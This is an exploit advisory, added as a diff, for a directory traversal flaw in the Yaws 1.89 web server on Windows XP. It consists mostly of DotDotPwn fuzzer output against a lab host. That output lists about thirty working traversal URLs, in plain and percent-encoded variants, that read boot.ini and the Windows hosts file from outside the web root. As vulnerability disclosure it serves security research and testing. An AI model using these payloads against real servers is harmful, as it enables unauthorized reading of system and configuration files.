@@ -1,0 +1,123 @@
+# Exploit Title: Yaws 1.89 Directory Traversal
+# Date: 29 Oct
+# Author: nitr0us (Alejandro Hernandez H.)
+# Software Link: http://yaws.hyber.org/download/Yaws-1.89-windows-installer.exe
+# Version: 1.89
+# Tested on: Windows XP Service Pack 2
+
+Chatsubo [(in)Security Dark] Labs
+http://chatsubo-labs.blogspot.com
+http://www.brainoverflow.org
+
+EXPLOIT:
+************************************************************************************
+******* Released @ BugCon Security Conferences 2010 - http://www.bugcon.org ********
+************************************************************************************
+
+nitr0us@daiquiri ~ #./dotdotpwn.pl -m http -h 192.168.242.128 -O -s -d 3 -t 100 -q
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                               - DotDotPwn v2.1 -                              #
+#                         The Directory Traversal Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                              by chr1x & nitr0us                               #
+#################################################################################
+
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 192.168.242.128
+[+] Detecting Operating System (nmap) ...
+[+] Operating System detected:  Microsoft Windows XP SP2 or Windows Server 2003 SP0/SP1
+[+] Protocol: http
+[+] Port: 80
+[+] Service detected:
+Yaws/1.89 Yet Another Web Server
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Multiplying 3 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Adapting the filenames according to the OS type detected (windows)
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 2328
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 10.00 traversals per second
+[+] Press any key to start the testing (You can stop it pressing Ctrl + C)
+
+[*] Testing Path: http://192.168.242.128:80/..\..\..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\..\..\windows\system32\drivers\etc\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..%5c..%5c..%5cboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/%2e%2e\%2e%2e\%2e%2e\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\/..\/..\/windows\/system32\/drivers\/etc\/hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/..\/\..\/\..\/\windows\/\system32\/\drivers\/\etc\/\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/\../\../\../boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/\../\../\../windows/\system32/\drivers/\etc/\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80//..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80//..\/..\/..\windows\/system32\/drivers\/etc\/hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/.\..\.\..\.\..\windows\system32\drivers\etc\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\..\..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\..\..\windows\system32\drivers\etc\hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80////..\..\..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80////..\..\..\windows///system32///drivers///etc///hosts <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/\\\..\..\..\boot.ini <- VULNERABLE!
+
+[*] Testing Path: http://192.168.242.128:80/\\\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts <- VULNERABLE!
+
+[+] Fuzz testing finished after 10.68 minutes (641 seconds)
+[+] Total Traversals found: 30
